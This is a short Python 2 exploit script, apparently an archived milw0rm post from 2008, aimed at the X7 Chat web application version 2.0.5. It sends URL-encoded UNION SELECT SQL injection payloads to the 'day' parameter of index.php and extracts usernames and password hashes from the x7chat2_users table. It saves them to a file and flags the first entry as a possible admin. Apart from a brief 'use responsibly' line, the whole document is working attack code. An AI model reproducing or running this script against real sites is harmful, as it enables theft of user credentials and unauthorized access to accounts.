#!/usr/bin/python
#
#Exploit for xchat 2.0.5
#Saca los usuarios y los hash
#By nonroot - 2008
#it's a PoC, please use responsibly
#
import string,urllib
import sys,re
print "Target host: i.e: http://127.0.0.1/x7chat/"
host=raw_input("Target host ( include http and /): ")
print "Output file: i.e: salida.txt"
out_file=raw_input("Output file: ")
print "trying ..."
SQL_users="1%20UNION%20select%20username,id,username%20from%20x7chat2_users%20--"
SQL_hashs="1%20UNION%20select%20username,id,password%20from%20x7chat2_users%20--"
link_attack=host+"index.php?act=sm_window&page=event&day="
response = urllib.urlopen(link_attack + SQL_users).read()
findall_users=re.compile("</b>(\w+)<Br><Br>").findall
found_users=findall_users(response)
if len(found_users)==0:
	print "Sorry, exploit failed, please review the SQL string and try to change something like tables or wathever"
	print "Or, there are not users, or x7chat software is version >= 2.0.5.1, so sorry. try to find a new bug ;)"
	sys.exit()
#Find the hashs
response = urllib.urlopen(link_attack + SQL_hashs).read()
findall_hashs=re.compile("</b>(\w+)<Br><Br>").findall
found_hashs=findall_hashs(response)
if len(found_hashs)==0:
	print "Sorry, exploit failed, please review the SQL string and try to change something like tables or wathever"
	print "Or, there are not hashs, or x7chat software is version >= 2.0.5.1, so sorry. try to find a new bug ;)"
	sys.exit()
#Save all this at file
file = open(out_file, "w")
file.write("*********************************************************************\n")
file.write("\n")
file.write("HOST:")
file.write("	")
file.write(host)
file.write("\n")
file.write("\n")
file.write("USER						HASH\n")
file.write("possible admin user: ")
file.write(found_users[0])
file.write("			")
file.write(found_hashs[0])
file.write("\n")
for i in range(len(found_users)):
	file.write(found_users[i])
	file.write("		 				")
	file.write(found_hashs[i])
	file.write("\n")
file.write("\n")
file.write("*********************************************************************\n")
file.close()
print "Successfull, please review the ",out_file," file."

# milw0rm.com [2008-01-14]